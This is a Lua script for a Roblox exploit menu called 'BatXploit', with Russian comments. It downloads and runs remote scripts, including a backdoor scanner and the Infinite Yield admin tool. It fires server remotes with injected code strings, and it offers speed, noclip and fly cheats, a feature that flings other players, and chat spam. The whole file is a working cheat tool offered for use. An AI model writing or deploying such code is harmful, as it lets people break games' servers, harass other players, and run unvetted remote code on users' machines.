--█████▄  ▄▄▄ ▄▄▄▄▄▄ ██  ██ ▄▄▄▄  ▄▄     ▄▄▄  ▄▄ ▄▄▄▄▄▄   ██      ▄▄▄   ▄▄▄  ▄▄▄▄  ▄▄▄▄▄ ▄▄▄▄   ██   ██████ ▄▄  ▄▄   ▄▄  ▄▄▄  ▄▄ ▄▄   ▀█▄ 
--██▄▄██ ██▀██  ██    ████  ██▄█▀ ██    ██▀██ ██   ██     ██     ██▀██ ██▀██ ██▀██ ██▄▄  ██▀██  ██   ██▄▄   ███▄██   ██ ██▀██ ▀███▀ ▀  ██ 
--██▄▄█▀ ██▀██  ██   ██  ██ ██    ██▄▄▄ ▀███▀ ██   ██     ██████ ▀███▀ ██▀██ ████▀ ██▄▄▄ ████▀  ▄▄   ██▄▄▄▄ ██ ▀██ ▄▄█▀ ▀███▀   █   ▄ ▄█▀ 

print("BatXploit UI - Inspired by LALOL Hub")

-- Проверяем, установлена ли библиотека Rayfield
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local window = Rayfield:CreateWindow({
    Name = "BatXploit",
    LoadingTitle = "BatXploit",
    LoadingSubtitle = "from .bat to .exe",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = "BatXploit",
        FileName = "Settings"
    },
    Discord = {
        Enabled = true,
        Invite = "your_discord_invite", -- замени на свой Discord
        RememberJoins = true
    },
    KeySystem = false, -- отключаем ключи, можно включить если нужно
})

-- ========== ВКЛАДКА "SCANNER" ==========
local scannerTab = window:CreateTab("Scanner", 4483362458) -- иконка (ID можно заменить)

scannerTab:CreateButton({
    Name = "Start Backdoor Scan",
    Callback = function()
        -- Здесь будет твой код сканера (например, агрессивный или LALOL метод)
        -- Просто пример:
        print("Запуск сканера...")
        -- Можно вставить сюда твой скрипт сканера
        loadstring(game:HttpGet("https://raw.githubusercontent.com/str3llbatofficial/BatXploit/main/Backdoorscanner(maybe).lua"))()
    end,
})

scannerTab:CreateInput({
    Name = "Custom Remote Path",
    PlaceholderText = "game.ReplicatedStorage.SomeRemote",
    RemoveTextAfterFocusLost = false,
    Callback = function(text)
        _G.CustomRemote = text
        print("Установлен путь: " .. text)
    end,
})

scannerTab:CreateButton({
    Name = "Execute on Custom Remote",
    Callback = function()
        if _G.CustomRemote then
            local remote = loadstring("return " .. _G.CustomRemote)()
            if remote then
                pcall(function()
                    remote:FireServer("print('BatXploit test')")
                end)
                print("Отправлено на " .. _G.CustomRemote)
            else
                print("Remote не найден")
            end
        end
    end,
})

-- ========== ВКЛАДКА "EXPLOITS" ==========
local exploitsTab = window:CreateTab("Exploits", 4483362458)

exploitsTab:CreateSection("Movement")

exploitsTab:CreateSlider({
    Name = "Walk Speed",
    Range = {0, 250},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 16,
    Flag = "walkSpeed",
    Callback = function(v)
        local player = game.Players.LocalPlayer
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.WalkSpeed = v
        end
    end,
})

exploitsTab:CreateSlider({
    Name = "Jump Power",
    Range = {0, 250},
    Increment = 1,
    Suffix = "Power",
    CurrentValue = 50,
    Flag = "jumpPower",
    Callback = function(v)
        local player = game.Players.LocalPlayer
        local char = player.Character
        if char and char:FindFirstChild("Humanoid") then
            char.Humanoid.JumpPower = v
        end
    end,
})

exploitsTab:CreateToggle({
    Name = "Noclip",
    CurrentValue = false,
    Flag = "noclip",
    Callback = function(state)
        _G.NoClip = state
        local player = game.Players.LocalPlayer
        local runService = game:GetService("RunService")
        if state then
            _G.NoclipConnection = runService.Stepped:Connect(function()
                local char = player.Character
                if char then
                    for _, part in pairs(char:GetDescendants()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end)
        else
            if _G.NoclipConnection then
                _G.NoclipConnection:Disconnect()
                _G.NoclipConnection = nil
            end
            local char = player.Character
            if char then
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end,
})

exploitsTab:CreateToggle({
    Name = "Infinite Jump",
    CurrentValue = false,
    Flag = "infJump",
    Callback = function(state)
        _G.InfiniteJump = state
        local player = game.Players.LocalPlayer
        local UIS = game:GetService("UserInputService")
        if state then
            _G.JumpConnection = UIS.JumpRequested:Connect(function()
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    char.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                end
            end)
        else
            if _G.JumpConnection then
                _G.JumpConnection:Disconnect()
                _G.JumpConnection = nil
            end
        end
    end,
})

exploitsTab:CreateButton({
    Name = "Fly (Simple)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "BatXploit",
            Text = "Use ;fly in chat",
            Duration = 3
        })
    end,
})

-- ========== ВКЛАДКА "FLING" ==========
local flingTab = window:CreateTab("Fling", 4483362458)

flingTab:CreateInput({
    Name = "Target Player Name",
    PlaceholderText = "Enter username",
    RemoveTextAfterFocusLost = false,
    Callback = function(name)
        _G.FlingTarget = name
    end,
})

flingTab:CreateButton({
    Name = "Fling Target",
    Callback = function()
        local target = _G.FlingTarget
        if not target or target == "" then
            print("No target set")
            return
        end
        local player = game.Players:FindFirstChild(target)
        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local hrp = player.Character.HumanoidRootPart
            local bv = Instance.new("BodyVelocity")
            bv.MaxForce = Vector3.new(1,1,1)*1e6
            bv.Velocity = Vector3.new(math.random(-500,500), math.random(100,500), math.random(-500,500))
            bv.Parent = hrp
            task.wait(0.5)
            bv:Destroy()
            print("Flinged " .. target)
        else
            print("Target not found or no character")
        end
    end,
})

-- ========== ВКЛАДКА "UTILITIES" ==========
local utilsTab = window:CreateTab("Utilities", 4483362458)

utilsTab:CreateButton({
    Name = "Rejoin",
    Callback = function()
        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
    end,
})

utilsTab:CreateButton({
    Name = "Server Hop",
    Callback = function()
        local servers = {}
        for _, v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?limit=100")).data) do
            if type(v) == "table" and v.playing and v.id ~= game.JobId then
                table.insert(servers, v.id)
            end
        end
        if #servers > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game.Players.LocalPlayer)
        else
            print("No other servers found")
        end
    end,
})

utilsTab:CreateButton({
    Name = "Clear Chat",
    Callback = function()
        for i=1,50 do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("", "All")
        end
    end,
})

utilsTab:CreateToggle({
    Name = "Anti-AFK",
    CurrentValue = false,
    Flag = "antiAFK",
    Callback = function(state)
        local player = game.Players.LocalPlayer
        if state then
            _G.AFKConnection = game:GetService("Players").LocalPlayer.Idled:Connect(function()
                local VirtualUser = game:GetService("VirtualUser")
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
        else
            if _G.AFKConnection then
                _G.AFKConnection:Disconnect()
                _G.AFKConnection = nil
            end
        end
    end,
})

-- Уведомление о загрузке
Rayfield:Notify({
    Title = "BatXploit",
    Content = "UI Loaded! Enjoy :)",
    Duration = 3,
    Image = 4914902889, -- иконка (опционально)
})
